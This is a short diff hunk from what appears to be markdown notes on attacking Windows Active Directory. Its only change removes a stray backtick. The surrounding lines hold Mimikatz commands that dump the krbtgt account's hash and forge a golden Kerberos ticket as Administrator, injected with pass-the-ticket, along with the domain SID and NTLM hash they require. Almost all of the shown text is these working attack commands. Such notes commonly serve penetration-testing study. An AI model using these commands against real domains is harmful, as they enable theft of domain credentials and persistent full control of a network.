@@ -158,7 +158,7 @@ lsadump::lsa /inject /name:krbtgt
 ```
 - We need the SID of the domain
 - NTLM hash
-`
+
 ```
 kerberos::golden /User:Administrator /domain:[domain name] /sid:[domain SID] /krbtgt:[NTLM hash] /id:500 /ptt
 ```
